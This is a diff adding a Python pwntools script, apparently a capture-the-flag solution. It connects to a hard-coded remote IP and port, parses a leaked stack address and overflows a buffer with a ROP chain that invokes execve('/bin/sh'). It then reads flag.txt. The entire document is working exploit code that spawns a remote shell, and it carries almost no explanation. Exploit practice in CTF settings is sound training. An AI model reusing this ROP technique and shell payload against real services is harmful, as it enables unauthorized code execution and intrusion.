@@ -1,0 +1,60 @@
+#!/usr/bin/env python3
+from pwn import *
+
+# 設定目標伺服器
+host = "140.113.207.245"
+port = 30173
+
+# 連接到伺服器
+conn = remote(host, port)
+
+output = conn.recvline_contains(b"stack address")
+buf_addr = int(output.split(b" ")[-1], 16)  # 解析地址
+print(f"Buffer address: {hex(buf_addr)}")  # 輸出 buf 地址
+
+# 手動提供 Gadgets 地址
+pop_rdi_rbp_ret = 0x402188  # 替換為找到的 Gadget 地址
+pop_rsi_rbp_ret = 0x40a422  # 替換為找到的 Gadget 地址
+pop_rdx_ret = 0x413270  # 替換為找到的 Gadget 地址
+pop_rax_ret = 0x427f2b  # 替換為找到的 Gadget 地址
+syscall_ret = 0x4291db  # 替換為找到的 syscall 地址
+
+payload = b"/bin/sh\x00"  # 將 "/bin/sh" 放入 buffer
+payload += b"A" * (16 - len(payload))  # 填充剩餘的 buffer
+payload += b"B" * 8  # 填充到返回地址
+
+# # 構造 ROP chain
+rop = b""
+rop += p64(pop_rdi_rbp_ret)  # 將堆疊上的 "/bin/sh" 地址放入 rdi
+rop += p64(buf_addr)  # 假設 "/bin/sh" 存在於堆疊上的這個地址
+rop += p64(0)
+rop += p64(pop_rsi_rbp_ret)  # 將 NULL 放入 rsi
+rop += p64(0)
+rop += p64(0)
+rop += p64(pop_rdx_ret)  # 將 NULL 放入 rdx
+rop += p64(0)
+rop += p64(pop_rax_ret)  # 將 59 放入 rax
+rop += p64(59)
+rop += p64(syscall_ret)  # 執行 syscall
+
+payload += rop
+
+# 發送 payload
+conn.sendline(payload)
+# conn.sendline(b"cat flag.txt")
+# conn.recvline()  # 接收 flag.txt 的內容
+# conn.close()  # 關閉連接
+
+command = "cat flag.txt\n"
+for char in command:
+    conn.send(char.encode())  # 將每個字元逐一傳送
+
+# 接收並打印回應
+response = conn.recvall(timeout=5).decode()
+print(response)
+
+# 關閉連線
+conn.close()
+
+# 進入互動模式
+# conn.interactive()
